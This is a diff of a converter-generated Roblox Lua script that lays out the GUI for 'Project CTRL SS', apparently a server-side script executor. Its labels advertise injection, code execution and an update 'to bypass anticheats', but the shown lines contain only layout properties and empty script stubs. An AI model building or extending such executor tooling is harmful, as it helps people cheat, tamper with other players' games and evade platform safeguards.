@@ -7,233 +7,237 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 155 | Scripts: 53 | Modules: 0 | Tags: 0
+-- Instances: 153 | Scripts: 33 | Modules: 0 | Tags: 0
 local G2L = {};
 
--- StarterGui.project CTRL
+-- StarterGui.ScreenGui
 G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
-G2L["1"]["Name"] = [[project CTRL]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
-G2L["1"]["ResetOnSpawn"] = false;
 
 
--- StarterGui.project CTRL.Frame
+-- StarterGui.ScreenGui.Frame
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BorderSizePixel"] = 0;
-G2L["2"]["BackgroundColor3"] = Color3.fromRGB(62, 62, 62);
-G2L["2"]["Size"] = UDim2.new(0, 423, 0, 296);
-G2L["2"]["Position"] = UDim2.new(0.34288, 0, 0.33081, 0);
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(76, 76, 76);
+G2L["2"]["Size"] = UDim2.new(0, 407, 0, 296);
+G2L["2"]["Position"] = UDim2.new(0.32772, 0, 0.28788, 0);
 G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.project CTRL.Frame.UIStroke
+-- StarterGui.ScreenGui.Frame.UIStroke
 G2L["3"] = Instance.new("UIStroke", G2L["2"]);
 
 
 
--- StarterGui.project CTRL.Frame.Frame
+-- StarterGui.ScreenGui.Frame.Frame
 G2L["4"] = Instance.new("Frame", G2L["2"]);
 G2L["4"]["BorderSizePixel"] = 0;
 G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4"]["Size"] = UDim2.new(0, 423, 0, 3);
-G2L["4"]["Position"] = UDim2.new(0, 0, 0.11824, 0);
+G2L["4"]["Size"] = UDim2.new(0, 407, 0, 2);
+G2L["4"]["Position"] = UDim2.new(0, 0, 0.11486, 0);
 G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 
 
--- StarterGui.project CTRL.Frame.top
-G2L["5"] = Instance.new("TextLabel", G2L["2"]);
-G2L["5"]["TextWrapped"] = true;
+-- StarterGui.ScreenGui.Frame.Frame
+G2L["5"] = Instance.new("Frame", G2L["2"]);
 G2L["5"]["BorderSizePixel"] = 0;
-G2L["5"]["TextSize"] = 14;
-G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["5"]["TextScaled"] = true;
-G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5"]["BackgroundTransparency"] = 1;
-G2L["5"]["Size"] = UDim2.new(0, 207, 0, 35);
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Size"] = UDim2.new(0, 3, 0, 262);
+G2L["5"]["Position"] = UDim2.new(0.10565, 0, 0.11486, 0);
 G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5"]["Text"] = [[project CTRL SS]];
-G2L["5"]["Name"] = [[top]];
 
 
--- StarterGui.project CTRL.Frame.top.UIStroke
-G2L["6"] = Instance.new("UIStroke", G2L["5"]);
+-- StarterGui.ScreenGui.Frame.Dragify
+G2L["6"] = Instance.new("LocalScript", G2L["2"]);
+G2L["6"]["Name"] = [[Dragify]];
 
 
-
--- StarterGui.project CTRL.Frame.Frame
-G2L["7"] = Instance.new("Frame", G2L["2"]);
+-- StarterGui.ScreenGui.Frame.TextLabel
+G2L["7"] = Instance.new("TextLabel", G2L["2"]);
+G2L["7"]["TextWrapped"] = true;
 G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["TextSize"] = 14;
+G2L["7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["7"]["TextScaled"] = true;
 G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7"]["Size"] = UDim2.new(0, 3, 0, 258);
-G2L["7"]["Position"] = UDim2.new(0.10638, 0, 0.12838, 0);
+G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["BackgroundTransparency"] = 1;
+G2L["7"]["Size"] = UDim2.new(0, 407, 0, 34);
 G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["Text"] = [[Project CTRL SS]];
 
 
--- StarterGui.project CTRL.Frame.page1
-G2L["8"] = Instance.new("Frame", G2L["2"]);
-G2L["8"]["BorderSizePixel"] = 0;
-G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8"]["Size"] = UDim2.new(0, 378, 0, 258);
-G2L["8"]["Position"] = UDim2.new(0.10638, 0, 0.12838, 0);
-G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8"]["Name"] = [[page1]];
-G2L["8"]["BackgroundTransparency"] = 1;
+-- StarterGui.ScreenGui.Frame.TextLabel.UIStroke
+G2L["8"] = Instance.new("UIStroke", G2L["7"]);
 
 
--- StarterGui.project CTRL.Frame.page1.ImageLabel
-G2L["9"] = Instance.new("ImageLabel", G2L["8"]);
+
+-- StarterGui.ScreenGui.Frame.page1
+G2L["9"] = Instance.new("Frame", G2L["2"]);
+G2L["9"]["Visible"] = false;
 G2L["9"]["BorderSizePixel"] = 0;
-G2L["9"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["9"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
-G2L["9"]["Size"] = UDim2.new(0, 100, 0, 100);
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["9"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["9"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
 G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9"]["BackgroundTransparency"] = 1;
-G2L["9"]["Position"] = UDim2.new(0.03948, 0, 0.03447, 0);
+G2L["9"]["Name"] = [[page1]];
+G2L["9"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.project CTRL.Frame.page1.ImageLabel.LocalScript
-G2L["a"] = Instance.new("LocalScript", G2L["9"]);
+-- StarterGui.ScreenGui.Frame.page1.ImageLabel
+G2L["a"] = Instance.new("ImageLabel", G2L["9"]);
+G2L["a"]["BorderSizePixel"] = 0;
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["a"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
+G2L["a"]["Size"] = UDim2.new(0, 100, 0, 100);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["BackgroundTransparency"] = 1;
+G2L["a"]["Position"] = UDim2.new(0.02263, 0, 0.03066, 0);
 
 
-
--- StarterGui.project CTRL.Frame.page1.ImageLabel.UIStroke
-G2L["b"] = Instance.new("UIStroke", G2L["9"]);
-G2L["b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["b"]["Thickness"] = 2;
-
-
--- StarterGui.project CTRL.Frame.page1.TextLabel
-G2L["c"] = Instance.new("TextLabel", G2L["8"]);
-G2L["c"]["TextWrapped"] = true;
-G2L["c"]["BorderSizePixel"] = 0;
-G2L["c"]["TextSize"] = 14;
-G2L["c"]["TextScaled"] = true;
-G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c"]["BackgroundTransparency"] = 1;
-G2L["c"]["Size"] = UDim2.new(0, 253, 0, 49);
-G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["c"]["Text"] = [[Welcome, {player}]];
-G2L["c"]["Position"] = UDim2.new(0.33069, 0, 0.03447, 0);
-
-
--- StarterGui.project CTRL.Frame.page1.TextLabel.UIStroke
-G2L["d"] = Instance.new("UIStroke", G2L["c"]);
+-- StarterGui.ScreenGui.Frame.page1.ImageLabel.LocalScript
+G2L["b"] = Instance.new("LocalScript", G2L["a"]);
 
 
 
--- StarterGui.project CTRL.Frame.page1.TextLabel.LocalScript
-G2L["e"] = Instance.new("LocalScript", G2L["c"]);
+-- StarterGui.ScreenGui.Frame.page1.ImageLabel.UIStroke
+G2L["c"] = Instance.new("UIStroke", G2L["a"]);
+G2L["c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["c"]["Thickness"] = 2;
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextLabel
+G2L["d"] = Instance.new("TextLabel", G2L["9"]);
+G2L["d"]["TextWrapped"] = true;
+G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["TextSize"] = 14;
+G2L["d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["d"]["TextScaled"] = true;
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["BackgroundTransparency"] = 1;
+G2L["d"]["Size"] = UDim2.new(0, 245, 0, 25);
+G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d"]["Text"] = [[Welcome, player]];
+G2L["d"]["Position"] = UDim2.new(0.32133, 0, 0.02692, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
+G2L["e"] = Instance.new("UIStroke", G2L["d"]);
 
 
 
--- StarterGui.project CTRL.Frame.page1.TextLabel
-G2L["f"] = Instance.new("TextLabel", G2L["8"]);
-G2L["f"]["TextWrapped"] = true;
-G2L["f"]["BorderSizePixel"] = 0;
-G2L["f"]["TextSize"] = 14;
-G2L["f"]["TextScaled"] = true;
-G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f"]["BackgroundTransparency"] = 1;
-G2L["f"]["Size"] = UDim2.new(0, 253, 0, 49);
-G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f"]["Text"] = [[The GUI has been reworked]];
-G2L["f"]["Position"] = UDim2.new(0.33069, 0, 0.23215, 0);
-
-
--- StarterGui.project CTRL.Frame.page1.TextLabel.UIStroke
-G2L["10"] = Instance.new("UIStroke", G2L["f"]);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel.LocalScript
+G2L["f"] = Instance.new("LocalScript", G2L["d"]);
 
 
 
--- StarterGui.project CTRL.Frame.page1.TextLabel
-G2L["11"] = Instance.new("TextLabel", G2L["8"]);
-G2L["11"]["TextWrapped"] = true;
-G2L["11"]["BorderSizePixel"] = 0;
-G2L["11"]["TextSize"] = 14;
-G2L["11"]["TextScaled"] = true;
-G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["Size"] = UDim2.new(0, 378, 0, 40);
-G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["11"]["Text"] = [[We now have a more advanced scanner!]];
-G2L["11"]["Position"] = UDim2.new(0, 0, 0.42594, 0);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel
+G2L["10"] = Instance.new("TextLabel", G2L["9"]);
+G2L["10"]["TextWrapped"] = true;
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["TextSize"] = 14;
+G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["10"]["TextScaled"] = true;
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["BackgroundTransparency"] = 1;
+G2L["10"]["Size"] = UDim2.new(0, 245, 0, 75);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["Text"] = [[This is a rework of CTRL SS]];
+G2L["10"]["Position"] = UDim2.new(0.32133, 0, 0.12308, 0);
 
 
--- StarterGui.project CTRL.Frame.page1.TextLabel.UIStroke
-G2L["12"] = Instance.new("UIStroke", G2L["11"]);
-
-
-
--- StarterGui.project CTRL.Frame.page1.TextLabel
-G2L["13"] = Instance.new("TextLabel", G2L["8"]);
-G2L["13"]["TextWrapped"] = true;
-G2L["13"]["BorderSizePixel"] = 0;
-G2L["13"]["TextSize"] = 14;
-G2L["13"]["TextScaled"] = true;
-G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["13"]["BackgroundTransparency"] = 1;
-G2L["13"]["Size"] = UDim2.new(0, 378, 0, 40);
-G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13"]["Text"] = [[Version: 1.0.0]];
-G2L["13"]["Position"] = UDim2.new(0, 0, 0.58098, 0);
-
-
--- StarterGui.project CTRL.Frame.page1.TextLabel.UIStroke
-G2L["14"] = Instance.new("UIStroke", G2L["13"]);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
+G2L["11"] = Instance.new("UIStroke", G2L["10"]);
 
 
 
--- StarterGui.project CTRL.Frame.page1.Status
-G2L["15"] = Instance.new("TextLabel", G2L["8"]);
-G2L["15"]["TextWrapped"] = true;
-G2L["15"]["BorderSizePixel"] = 0;
-G2L["15"]["TextSize"] = 14;
-G2L["15"]["TextScaled"] = true;
-G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15"]["BackgroundTransparency"] = 1;
-G2L["15"]["Size"] = UDim2.new(0, 378, 0, 40);
-G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["15"]["Text"] = [[Status: NOT Injected]];
-G2L["15"]["Name"] = [[Status]];
-G2L["15"]["Position"] = UDim2.new(0, 0, 0.73602, 0);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel
+G2L["12"] = Instance.new("TextLabel", G2L["9"]);
+G2L["12"]["TextWrapped"] = true;
+G2L["12"]["BorderSizePixel"] = 0;
+G2L["12"]["TextSize"] = 14;
+G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["12"]["TextScaled"] = true;
+G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12"]["BackgroundTransparency"] = 1;
+G2L["12"]["Size"] = UDim2.new(0, 353, 0, 34);
+G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12"]["Text"] = [[Now a more advanced scanner!]];
+G2L["12"]["Position"] = UDim2.new(0.02216, 0, 0.44615, 0);
 
 
--- StarterGui.project CTRL.Frame.page1.Status.UIStroke
-G2L["16"] = Instance.new("UIStroke", G2L["15"]);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
+G2L["13"] = Instance.new("UIStroke", G2L["12"]);
 
 
 
--- StarterGui.project CTRL.Frame.Dragify
-G2L["17"] = Instance.new("LocalScript", G2L["2"]);
-G2L["17"]["Name"] = [[Dragify]];
+-- StarterGui.ScreenGui.Frame.page1.TextLabel
+G2L["14"] = Instance.new("TextLabel", G2L["9"]);
+G2L["14"]["TextWrapped"] = true;
+G2L["14"]["BorderSizePixel"] = 0;
+G2L["14"]["TextSize"] = 14;
+G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["14"]["TextScaled"] = true;
+G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["BackgroundTransparency"] = 1;
+G2L["14"]["Size"] = UDim2.new(0, 353, 0, 34);
+G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14"]["Text"] = [[Updated to bypass anticheats]];
+G2L["14"]["Position"] = UDim2.new(0.02216, 0, 0.57692, 0);
 
 
--- StarterGui.project CTRL.Frame.page2
+-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
+G2L["15"] = Instance.new("UIStroke", G2L["14"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page1.Status
+G2L["16"] = Instance.new("TextLabel", G2L["9"]);
+G2L["16"]["TextWrapped"] = true;
+G2L["16"]["BorderSizePixel"] = 0;
+G2L["16"]["TextSize"] = 14;
+G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["16"]["TextScaled"] = true;
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["BackgroundTransparency"] = 1;
+G2L["16"]["Size"] = UDim2.new(0, 353, 0, 34);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["Text"] = [[Status: NOT Injected]];
+G2L["16"]["Name"] = [[Status]];
+G2L["16"]["Position"] = UDim2.new(0.02216, 0, 0.70769, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page1.Status.UIStroke
+G2L["17"] = Instance.new("UIStroke", G2L["16"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page2
 G2L["18"] = Instance.new("Frame", G2L["2"]);
 G2L["18"]["Visible"] = false;
 G2L["18"]["BorderSizePixel"] = 0;
-G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["18"]["Size"] = UDim2.new(0, 378, 0, 258);
-G2L["18"]["Position"] = UDim2.new(0.10638, 0, 0.12838, 0);
+G2L["18"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["18"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["18"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
 G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["18"]["Name"] = [[page2]];
-G2L["18"]["BackgroundTransparency"] = 1;
+G2L["18"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.project CTRL.Frame.page2.Text
+-- StarterGui.ScreenGui.Frame.page2.Text
 G2L["19"] = Instance.new("ScrollingFrame", G2L["18"]);
 G2L["19"]["Active"] = true;
 G2L["19"]["BorderSizePixel"] = 0;
@@ -241,24 +245,23 @@ G2L["19"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
 G2L["19"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
 G2L["19"]["Name"] = [[Text]];
 G2L["19"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
-G2L["19"]["Size"] = UDim2.new(0, 375, 0, 222);
+G2L["19"]["Size"] = UDim2.new(1, 0, 0.83077, 0);
 G2L["19"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["19"]["Position"] = UDim2.new(0.00794, 0, 0, 0);
 G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["19"]["ScrollBarThickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.Text.LocalScript
+-- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
 G2L["1a"] = Instance.new("LocalScript", G2L["19"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.Text.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Text.UIStroke
 G2L["1b"] = Instance.new("UIStroke", G2L["19"]);
-G2L["1b"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextLabel
+
+-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel
 G2L["1c"] = Instance.new("TextLabel", G2L["19"]);
 G2L["1c"]["LineHeight"] = 1.01;
 G2L["1c"]["BorderSizePixel"] = 0;
@@ -267,27 +270,25 @@ G2L["1c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
 G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
 G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["1c"]["TextColor3"] = Color3.fromRGB(191, 191, 191);
-G2L["1c"]["Size"] = UDim2.new(0, 28, 0, 224);
+G2L["1c"]["Size"] = UDim2.new(0, 28, 0, 216);
 G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["1c"]["Text"] = [[1]];
 G2L["1c"]["AutomaticSize"] = Enum.AutomaticSize.Y;
 G2L["1c"]["Position"] = UDim2.new(0, 0, -0.00477, 0);
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextLabel.y
+-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.y
 G2L["1d"] = Instance.new("UIStroke", G2L["1c"]);
 G2L["1d"]["Name"] = [[y]];
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextLabel.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.UIStroke
 G2L["1e"] = Instance.new("UIStroke", G2L["1c"]);
 G2L["1e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["1e"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextBox
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox
 G2L["1f"] = Instance.new("TextBox", G2L["19"]);
-G2L["1f"]["CursorPosition"] = -1;
 G2L["1f"]["LineHeight"] = 1.01;
 G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["1f"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
@@ -302,39 +303,39 @@ G2L["1f"]["AutomaticSize"] = Enum.AutomaticSize.Y;
 G2L["1f"]["MultiLine"] = true;
 G2L["1f"]["ClearTextOnFocus"] = false;
 G2L["1f"]["PlaceholderText"] = [[-- require here]];
-G2L["1f"]["Size"] = UDim2.new(0, 347, 0, 224);
-G2L["1f"]["Position"] = UDim2.new(0.07289, 0, -0.00477, 0);
+G2L["1f"]["Size"] = UDim2.new(0, 332, 0, 216);
+G2L["1f"]["Position"] = UDim2.new(0.07756, 0, -0.00477, 0);
 G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["1f"]["Text"] = [[]];
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.LocalScript
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
 G2L["20"] = Instance.new("LocalScript", G2L["1f"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.Completor
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
 G2L["21"] = Instance.new("LocalScript", G2L["1f"]);
 G2L["21"]["Name"] = [[Completor]];
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.LocalScript
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
 G2L["22"] = Instance.new("LocalScript", G2L["1f"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.UIStroke
 G2L["23"] = Instance.new("UIStroke", G2L["1f"]);
 G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["23"]["Thickness"] = 3;
+G2L["23"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.y
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.y
 G2L["24"] = Instance.new("UIStroke", G2L["1f"]);
 G2L["24"]["Name"] = [[y]];
 
 
--- StarterGui.project CTRL.Frame.page2.Execute
+-- StarterGui.ScreenGui.Frame.page2.Execute
 G2L["25"] = Instance.new("TextButton", G2L["18"]);
 G2L["25"]["TextWrapped"] = true;
 G2L["25"]["BorderSizePixel"] = 0;
@@ -344,25 +345,25 @@ G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["25"]["BackgroundTransparency"] = 1;
-G2L["25"]["Size"] = UDim2.new(0, 81, 0, 33);
+G2L["25"]["Size"] = UDim2.new(0, 104, 0, 41);
 G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["25"]["Text"] = [[EXECUTE]];
+G2L["25"]["Text"] = [[Execute]];
 G2L["25"]["Name"] = [[Execute]];
-G2L["25"]["Position"] = UDim2.new(0.00794, 0, 0.87007, 0);
+G2L["25"]["Position"] = UDim2.new(0, 0, 0.83846, 0);
 
 
--- StarterGui.project CTRL.Frame.page2.Execute.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
 G2L["26"] = Instance.new("UIStroke", G2L["25"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.Execute.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
 G2L["27"] = Instance.new("UIStroke", G2L["25"]);
 G2L["27"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["27"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.Clear
+-- StarterGui.ScreenGui.Frame.page2.Clear
 G2L["28"] = Instance.new("TextButton", G2L["18"]);
 G2L["28"]["TextWrapped"] = true;
 G2L["28"]["BorderSizePixel"] = 0;
@@ -372,25 +373,25 @@ G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["28"]["BackgroundTransparency"] = 1;
-G2L["28"]["Size"] = UDim2.new(0, 81, 0, 33);
+G2L["28"]["Size"] = UDim2.new(0, 104, 0, 41);
 G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["28"]["Text"] = [[CLEAR]];
+G2L["28"]["Text"] = [[Clear]];
 G2L["28"]["Name"] = [[Clear]];
-G2L["28"]["Position"] = UDim2.new(0.22222, 0, 0.87007, 0);
+G2L["28"]["Position"] = UDim2.new(0.29086, 0, 0.83846, 0);
 
 
--- StarterGui.project CTRL.Frame.page2.Clear.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
 G2L["29"] = Instance.new("UIStroke", G2L["28"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.Clear.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
 G2L["2a"] = Instance.new("UIStroke", G2L["28"]);
 G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["2a"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.Inject
+-- StarterGui.ScreenGui.Frame.page2.Inject
 G2L["2b"] = Instance.new("TextButton", G2L["18"]);
 G2L["2b"]["TextWrapped"] = true;
 G2L["2b"]["BorderSizePixel"] = 0;
@@ -400,25 +401,25 @@ G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["2b"]["BackgroundTransparency"] = 1;
-G2L["2b"]["Size"] = UDim2.new(0, 81, 0, 33);
